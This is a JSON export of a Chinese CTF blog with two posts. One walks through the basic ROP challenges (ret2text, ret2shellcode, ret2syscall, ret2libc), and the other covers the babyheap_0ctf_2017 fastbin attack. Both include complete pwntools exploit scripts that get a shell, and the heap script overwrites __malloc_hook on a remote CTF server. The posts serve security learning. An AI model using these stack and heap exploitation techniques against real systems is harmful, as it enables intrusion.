{"pages":[],"posts":[{"title":"CTF-WIKI-pwn-基本ROP 漏洞复现","text":"基本ROP ret2text首先检查程序的保护机制。 关于各个保护机制的介绍 :https://www.cnblogs.com/Spider-spiders/p/8798628.html 看到只开启了NX保护，即不可在栈上执行代码。 使用IDA查看源码，可以看到这里有一个危险的gets函数 以及这里有一个system函数 所以如果能直接返回到0x804863A，即可执行该函数。 在GDB中对main函数里的gets函数下断点。 可以看到，存储局部变量 s(eax) 位于esp中存储 查看esp和ebp得知 s的地址为0xffffcecc ebp地址为0xffffcf38 两者距离108个字节 所以108+4=112即为返回地址的地址。( 因为没有开启canary，ebp上就是返回地址的值了。) python脚本，我会给出注释 12345from pwn import * sh = process('./ret2text') #本地链接到文件target = 0x804863a #执行system('/bin/sh')函数的地址sh.sendline('A' * 112 + p32(target)) # 112是上面计算出来的s距离返回地址的字节距离sh.interactive() #进行交互 ret2shellcode先检查程序的保护机制 全部关闭，并且通过RELRO 为Partial 部分模式，得知程序存在存在可读可写可执行段。 通过IDA观察得知，这次同样使用不安全的gets输入，并且将输入完的值拷贝至buf2，观察buf2是什么样的一块内存。 buf是一块位于bss段的可读可写可执行段。所以泄露思路为: 将shellcode拷贝至buf2里，然后通过堆栈溢出将函数返回到执行buf2即可。 在gets函数处下断点 得知s地址为0xffffcecc，ebp地址为0xffffcf38 ebp+4即为函数返回地址。 所以0xcf38-0xcecc+4即为s与返回地址之间的字节距离。 写python脚本 12345678910from pwn import *context.binary = 'ret2shellcode' #全局自动设置架构类型与os类型sh=process('./ret2shellcode') #本地连接target=0x804A080#buf2的地址shellcode=asm(shellcraft.sh())#产生以一个最简单的执行system('/bin/sh')的shellcode 并进行汇编print(p32(target))payload=shellcode.ljust(0xcf38-0xcecc+4,'A')+p32(target)sh.sendline(payload)sh.interactive() ret2syscall先检查开启了哪些防护措施 开启了NX保护，所以无法在栈上直接执行代码。 使用IDA查看，仍然是gets函数导致的栈溢出。 使用系统调用来完成漏洞利用。 找到pop eax,ret，以同样的方法找到ebx.ecx.edx 以及int 80h系统调用和bin/sh 接下来要了解payload这样构成的原因，需要知道这三个指令 在堆栈里，我们知道ebp+4的地方为返回地址。这是因为leave 时 esp=ebp+4,ret 将当前esp指向的值作为返回地址跳转并且ESP+4。 所以构造payload为 payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80]) 先用112个A填充，pop_eax_ret为第一个返回地址，然后ESP指向0xb,以此类推。 写出python脚本，之前都解释过 不再注释了。 123456789101112131415from pwn import *sh = process('./rop')context.binary= 'rop'binsh = 0x80be409int_0x80 = 0x8049421pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])sh.sendline(payload)sh.interactive() ret2libc1给出got表 PLT表 以及libc的相关解释，我觉得写的很清楚 https://blog.csdn.net/Retrovich/article/details/82973086 基本流程仍然相似，先检查保护 只打开了NX 检查是否存在/bin/sh 在IDA中查找system函数 查看到ptl处的system函数 写Python脚本 12345678from pwn import *context.binary = 'ret2libc1'sh = process('./ret2libc1')binsh = 0x8049720system = 0x8048460payload = flat(['A'*112+system+'b'*4+binsh])&quot;&quot;&quot;这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb' 作为虚假的地址，其后参数对应的参数内容。&quot;&quot;&quot;sh.sendline(payload)sh.interactive() ret2libc2这里仍然用相同的流程，唯一不同的是没有直接给出/bin/sh,需要先调用gets函数再利用pop ret调用system函数 直接给出python的脚本，与上一个例子相同，整体不再多赘述 1234567891011121314##!/usr/bin/env pythonfrom pwn import *sh = process('./ret2libc2')gets_plt = 0x08048460system_plt = 0x08048490pop_ebx = 0x0804843dbuf2 = 0x804a080payload = flat( ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])sh.sendline(payload)sh.sendline('/bin/sh')sh.interactive() 我给出了堆栈溢出的ESP指向流程图，顺着思考容易看懂payload ret2libc3 检查安全保护，只开启了NX IDA里查看，仍然是gets函数的堆栈溢出。 但是这里没有给system函数 也没有给定的/bin/sh 所以需要我们从libc中调用system函数 根据这个知识点 写exp,涉及新的东西我仍然全部做注释 12345678910111213141516171819202122232425from pwn import *from LibcSearcher import LibcSearchercontext.binary='ret2libc3'sh = process('./ret2libc3')ret2libc3 = ELF('ret2libc3') #静态加载ELF文件puts_plt = ret2libc3.plt['puts'] #获取指定文件的plt条目libc_start_main_got = ret2libc3.got['__libc_start_main'] #获取指定文件的got条目main = ret2libc3.symbols['_start'] #获取指定文件的函数地址print(&quot;leak main_got addr and return main&quot;)payload = flat(['A'*112,puts_plt,main,libc_start_main_got]) #先使用plts_plt函数打印出main函数的在got表中的真实地址sh.sendlineafter('Can you find it !?',payload)libc_start_main_addr = u32(sh.recv()[0:4]) #获取main函数的真实地址libc = LibcSearcher('__libc_start_main',libc_start_main_addr) #获取libclibcbase = libc_start_main_addr-libc.dump('__libc_start_main') #获取libc基地址system_addr = libcbase+libc.dump('system') #获取system地址binsh_addr = libcbase +libc.dump('str_bin_sh') #获取binsh字符串地址print(&quot;now get shell&quot;)payload = flat(['A'*112,system_addr,'A'*4,binsh_addr]) #这里开头‘A’的数量要具体到堆栈里调试观察，因为main函数开头先将ESP最后一位变为0即16位对齐，再减128.sh.send(payload)sh.interactive()","link":"/2021/11/11/ROP/"},{"title":"babyheap_0ctf_2017","text":"堆中各种参数的意义 malloc_chunk的结构参考文章：https://blog.csdn.net/weixin_43847969/article/details/104897249 pre_size: 这个参数分两种情况，一种情况记录大小，一种情况记录数据当前一个chunk的状态是空闲时记录大小（也就是被free的时候），当前一个chunk的状态不是空闲的时候，记录它的数据。然后是 size： 就是这个chunk的大小,size的最后3个比特位对大小没有影响，但是要表示了一些东西分别是non_main_arena :记录当前chunk是否属于主线程is_mapped：当前chunk是否由mmap分配prev_inuse：记录前一个chunk是否被分配（这个最重要，因为我们当这个参数为0时，我们能够通过它获得上一个chunk的大小和地址） fd,bk: 表示用户数据，或者表示地址chunk非空闲时，fd和bk存在的地方表示的是用户的数据，chunk空闲时，fd存储下一个空闲的chunk，bk指向上一个空闲的chunk，这个非物理相邻表示的意思是，这个上一个和下一个表示的是被free的顺序，而不是地址上的相邻。 chunk的结构 第一个是size of previous（前一个chunk的大小，如果前一个chunk空闲的话）第二个size of chunk 当前chunk的大小，然后再末尾有3个比特位amp分别代表上面介绍过的3个参数第三个就是存储数据的部分然后就到了下一个chunk(next_chunk)，我们把这个next_chunk称为chunk2,上面的chunk称为chunk1，可以看到如果chunk1正在使用的话，那么chunk的头部位置，也就是prev_size，会被chunk1使用然后chunk2的第二行的后三个比特位也分别是A01，A代表着是否属于主线程（这里我们不知道所以用A代替），0代表着当前chunk不是由mmap分配，1代表着前一个chunk已经被分配。 chunk被free后结构变化： 第一行,没变化，因为它是chunk1第二行开始，M的位置变成了0，代表着chunk不是由mmap分配第三行开始，原本存储数据的部分变成了forward pointer to next chunk in list也就是fd，前面已经介绍过了，这个地方如果被使用的时候是数据，如果被free了，那么就存储的是下一个空闲的chunk，下面的back pointer to previous chunk in list（bk）同理.然后就到了unused space，（maybe 0 bytes long），没有使用过的空间，这时候应该被收集到各种bin中去。然后就到了chunk2,第一行记录当前chunk的大小，（并且不会被前一个chunk占用）第二行记录前一个chunk的大小，并且末尾三位变成了A00,（这时候如果这个是堆中第一个被分配的chunk的话我们能通过prev_size字段获取上一个chunk的大小以及地址。） chunk的空间复用： bin及分类 fast bins small binslarge binsunsorted bins未被分类，刚被free未真的进入bin Top Chunk babyheap_0ctf_2017考点： fastbin attack 利用思路两次 double free 与 fastbin attack 。第一次先泄露 libc 地址，然后找到构造 fake chunk 的地址。第二次通过构造的 fake chunk 堆溢出覆写 __malloc_hook 完成 get shell 。 利用过程1、通过unsortedbin attack 来泄露libc地址 首先应该记住这样一条规律：当small chunk被释放时，它的fd、bk指向一个指针，这个指针指向top chunk地址，这个指针保存在main_arena的0x58偏移处，而main_arena是libc的data段中，是全局静态变量，所以偏移也是固定的，根据这些就可以计算出libc的基地址了，所以重点是当small chunk释放时，能读出fd 或者 bk的值 我首先通过如下重叠两个块来泄漏libc的地址（也是常见的攻击）。 payload: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *e = ELF('./libc-2.23.so')p = remote('node4.buuoj.cn',29370)# p = process('./babyheap')p.readuntil('Command:')context(log_level='debug')def alloc(a): p.writeline('1') p.readuntil('Size:') p.writeline(str(a)) #p.readuntil('Command:')def update(a,b,c): p.writeline('2') p.readuntil('Index:') p.writeline(str(a)) p.readuntil('Size:') p.writeline(str(b)) p.readuntil('Content:') p.write(c) p.readuntil('Command:')def dele(a): p.writeline('3') p.readuntil('Index:') p.writeline(str(a)) p.readuntil('Command:')def show(a): p.writeline('4') p.readuntil('Index:') p.writeline(str(a))alloc(0x18) #0alloc(0x18) #1alloc(0x68) #2alloc(0x68) #3update(0, 0x20, 'a'*0x18+p64(0x91)) #size1+size2dele(1) #1 #free1alloc(0x18) #alloc1show(2) #fd, bk at alloc2#gdb.attach(p)libcbase = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - 0x3c4b78log.info(hex(libcbase))malloc_hook = libcbase + 0x3c4aedlog.info(hex(malloc_hook))one = libcbase + 0x4526adele(2) #free2#gdb.attach(p)update(1, 0x28, 'a'*0x18+p64(0x71)+p64(malloc_hook)) #fd at 2-&gt;malloc_hook#gdb.attach(p)alloc(0x68) #2#gdb.attach(p)alloc(0x68) #4 at malloc_hook#gdb.attach(p)update(4, 0x1b, p8(2)*3+p64(2)*2+p64(one))#gdb.attach(p)alloc(255) p.interactive()","link":"/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/"}],"tags":[],"categories":[{"name":"pwn","slug":"pwn","link":"/categories/pwn/"}]}